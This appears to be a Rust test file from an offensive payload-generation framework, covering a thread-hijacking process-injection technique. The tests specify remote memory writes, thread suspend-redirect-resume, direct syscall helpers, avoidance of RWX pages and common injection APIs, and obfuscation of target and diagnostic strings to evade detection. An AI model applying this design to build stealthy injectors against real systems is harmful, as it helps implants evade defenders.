//! Tests for thread hijacking.

use super::{default_target, Params, DEF, MESSAGES};
use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;
use crate::techniques::{Category, TechniqueKind};

/// Renders the fragment with the default (obfuscating) string strategy.
fn render(params: &Params) -> String {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    params.render_fragment_for(&strings, PayloadFormat::Shellcode, None)
}

#[test]
fn parses_params_from_empty_yaml() {
    let step: TechniqueKind = serde_yml::from_str("technique: thread_hijacking\n")
        .expect("thread_hijacking should parse");
    assert_eq!(
        step,
        TechniqueKind::ThreadHijacking {
            params: Params::default()
        }
    );
}

#[test]
fn defaults_the_target_and_the_stack() {
    let params = Params::default();
    assert_eq!(params.target, default_target());
    assert!(!default_target().is_empty());
    assert!(
        params.dedicated_stack,
        "a private stack is the safe default: the payload must not run on the target's live frames"
    );
    assert!(params.pid.is_none());
    assert_eq!(params.wait_ms, 0);
}

#[test]
fn parses_a_payload_pid_and_stack_choice() {
    let step: TechniqueKind = serde_yml::from_str(
        "technique: thread_hijacking\nparams:\n  payload: implant\n  pid: 4242\n  dedicated_stack: false\n  wait_ms: 2500\n",
    )
    .expect("thread_hijacking with params should parse");
    match step {
        TechniqueKind::ThreadHijacking { params } => {
            assert_eq!(params.payload.as_deref(), Some("implant"));
            assert_eq!(params.pid, Some(4242));
            assert!(!params.dedicated_stack);
            assert_eq!(params.wait_ms, 2500);
        }
        other => panic!("expected thread_hijacking, got {other:?}"),
    }
}

#[test]
fn def_is_well_formed() {
    assert_eq!(DEF.name, "thread_hijacking");
    assert_eq!(DEF.category, Category::Execution);
    assert_eq!(DEF.attck, ["T1055.003"]);
    assert!(!DEF.requires.is_empty());
    assert!(!DEF.stub_fragment.is_empty());
    assert!(!DEF.readme.is_empty());
}

#[test]
fn def_exposes_the_execution_entry_point() {
    assert!(
        DEF.stub_fragment.contains("fn execute_payload"),
        "the fragment must define the Execution contract"
    );
}

#[test]
fn every_placeholder_is_substituted() {
    let fragment = render(&Params::default());
    assert!(
        !fragment.contains('$'),
        "unsubstituted placeholder in the rendered fragment"
    );
    assert!(!fragment.contains("MSG_"), "a message placeholder survived");
}

#[test]
fn the_target_never_appears_in_cleartext() {
    let params = Params {
        target: "some_unique_host_process.exe".to_string(),
        ..Params::default()
    };
    let fragment = render(&params);
    assert!(
        !fragment.contains(&params.target),
        "the target name must be rebuilt from obfuscated bytes"
    );
}

#[test]
fn every_diagnostic_is_obfuscated() {
    let fragment = render(&Params::default());
    for (placeholder, text) in MESSAGES {
        assert!(
            !DEF.stub_fragment.contains(text),
            "cleartext diagnostic for {placeholder} in the fragment"
        );
        assert!(
            !fragment.contains(text),
            "cleartext diagnostic for {placeholder} in the rendered fragment"
        );
    }
}

#[test]
fn the_private_stack_starts_at_the_null_return_slot() {
    let fragment = render(&Params::default());
    // The pointer the thread is given must be the slot the payload's `ret`
    // reads. Writing the null eight bytes below the returned pointer would make
    // the guard depend on freshly committed pages being zero-filled, and would
    // enter the payload 8 bytes off the `rsp % 16 == 8` the x64 ABI expects at a
    // function's first instruction.
    let entry = fragment
        .find("let entry = top - 8;")
        .expect("the private stack must define an entry slot");
    let written = fragment
        .find("entry as *const c_void")
        .expect("the null return address must be written at the entry slot");
    let returned = fragment
        .find("Ok(entry as u64)")
        .expect("the entry slot must be the stack pointer the thread gets");
    assert!(
        entry < written && written < returned,
        "the null slot and the returned stack pointer must be the same address"
    );
}

#[test]
fn the_wait_bound_is_rendered_as_a_u32_literal() {
    let params = Params {
        wait_ms: 1500,
        ..Params::default()
    };
    assert!(
        render(&params).contains("1500u32"),
        "wait_ms must reach the fragment as a u32 literal"
    );

    // The syscall layer takes a `u32` timeout (`u32::MAX` = infinite), so a
    // larger YAML value is clamped instead of wrapping.
    let huge = Params {
        wait_ms: u64::MAX,
        ..Params::default()
    };
    assert!(render(&huge).contains("4294967295u32"));
}

#[test]
fn an_explicit_pid_wins_over_the_target_name() {
    let params = Params {
        pid: Some(7),
        ..Params::default()
    };
    let fragment = render(&params);
    assert!(
        fragment.contains("Some(7u32)"),
        "the pid must be substituted"
    );
    // The name is still substituted (the branch that reads it must
    // type-check), but the pid is what the fragment matches on.
    assert!(fragment.contains("match Some(7u32)"));
}

#[test]
fn the_thread_is_redirected_and_resumed() {
    let fragment = render(&Params::default());
    let suspend = fragment
        .find("nt_suspend_thread")
        .expect("the target thread must be suspended");
    let set = fragment
        .find("nt_set_context_thread")
        .expect("the instruction pointer must be redirected");
    let resume = fragment
        .find("nt_resume_thread")
        .expect("the target thread must be resumed");
    assert!(
        suspend < set && set < resume,
        "the hijack must suspend, redirect, then resume"
    );
}

#[test]
fn no_thread_is_ever_created() {
    let fragment = render(&Params::default());
    for forbidden in ["CreateRemoteThread", "NtCreateThreadEx", "CreateThread"] {
        assert!(
            !fragment.contains(forbidden),
            "thread hijacking must not create a thread: {forbidden}"
        );
    }
}

#[test]
fn the_payload_region_is_never_writable_and_executable() {
    let fragment = render(&Params::default());
    assert!(
        fragment.contains("PAGE_READWRITE") && fragment.contains("PAGE_EXECUTE_READ"),
        "the region must be written before it is made executable"
    );
    assert!(
        !fragment.contains("PAGE_EXECUTE_READWRITE"),
        "an RWX region is exactly the signature the technique is meant to avoid"
    );
}

#[test]
fn the_fragment_uses_the_syscall_layer() {
    let fragment = render(&Params::default());
    for helper in [
        "crate::nt_open_process",
        "crate::nt_alloc_vm",
        "crate::nt_write_vm",
        "crate::nt_protect_vm",
        "crate::nt_suspend_thread",
        "crate::nt_get_context_thread",
        "crate::nt_set_context_thread",
        "crate::nt_resume_thread",
        "crate::nt_close",
    ] {
        assert!(
            fragment.contains(helper),
            "{helper} missing from the fragment"
        );
    }
    assert!(
        !fragment.contains("VirtualAllocEx")
            && !fragment.contains("WriteProcessMemory")
            && !fragment.contains("windows::Win32::System::Threading::SuspendThread"),
        "kernel-facing calls must go through the nt_* helpers"
    );
}

#[test]
fn the_runtime_guard_rejects_a_non_shellcode_format() {
    let strings = StringsConfig::from_yaml(None).expect("default strings");
    let shellcode = Params::default().render_fragment_for(&strings, PayloadFormat::Shellcode, None);
    assert!(
        shellcode.contains("if !true"),
        "a shellcode payload must pass the runtime guard"
    );

    let pe = Params::default().render_fragment_for(&strings, PayloadFormat::Pe, None);
    assert!(
        pe.contains("if !false"),
        "a non-shellcode payload must fail the runtime guard"
    );
}

#[test]
fn the_memory_is_written_before_the_thread_is_suspended() {
    let fragment = render(&Params::default());
    let write = fragment
        .find("place_payload")
        .expect("the payload must be placed in the target");
    let suspend = fragment
        .find("fn hijack")
        .expect("the hijack helper must exist");
    assert!(
        write < suspend,
        "the freeze window must not cover the payload copy"
    );
}

#[test]
fn fragment_has_no_forbidden_patterns() {
    for forbidden in [
        "anyhow",
        "static mut",
        "println!",
        "eprintln!",
        "unwrap(",
        "expect(",
        "todo!",
        "unimplemented!",
        "panic!",
    ] {
        assert!(
            !DEF.stub_fragment.contains(forbidden),
            "the fragment must not use {forbidden}"
        );
    }
}

#[test]
fn the_rendered_fragment_leaks_no_sensitive_literal() {
    // The CI guard (`no_sensitive_literals_in_generated_stubs`) compiles a stub
    // per technique; this is the same source-side check at unit-test speed and
    // scoped to this technique. Comments are stripped first, so a name that only
    // appears in the doc comments above is not a leak; a runtime literal is.
    let fragment = render(&Params::default());
    let leaked = crate::audit::strings::find_sensitive_literals_in_source(&fragment);
    assert!(
        leaked.is_empty(),
        "the fragment carries sensitive literals in cleartext: {leaked:?}"
    );
}
